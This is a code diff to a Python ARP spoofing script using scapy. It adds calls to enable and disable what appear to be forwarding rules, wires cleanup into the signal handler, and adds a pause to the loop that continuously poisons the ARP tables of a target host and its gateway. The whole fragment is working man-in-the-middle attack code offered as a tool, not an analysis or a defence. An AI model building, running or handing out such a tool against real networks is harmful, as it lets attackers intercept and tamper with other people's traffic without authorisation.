@@ -6,7 +6,7 @@ import argparse
 import scapy.all as scapy
 from colorama import Fore
 from modules.my_utils import show_message
-from modules.sys_utils import check_root
+from modules.sys_utils import check_root, enable_rules, disable_rules
 from modules.net_utils import get_gateway, get_own_mac, get_mac
 from modules.exit_handler import setup_signal_handler
 
@@ -28,9 +28,11 @@ def spoof(ip_address, spoof_ip, my_mac, victim_mac):
 def main():
 
     check_root()
-    setup_signal_handler()
+    setup_signal_handler(disable_rules)
     show_message("Executing:", "info", "Arp Spoof")
     arguments = get_arguments()
+
+    enable_rules()
         
     router_ip = get_gateway()
     my_mac = get_own_mac(arguments.interface)  # Passar la interfície correctament
@@ -39,6 +41,8 @@ def main():
     while True:
         spoof(arguments.target, router_ip, my_mac, victim_mac)
         spoof(router_ip, arguments.target, my_mac, victim_mac)
+
+        time.sleep(2)
 
 if __name__ == "__main__":
     main()
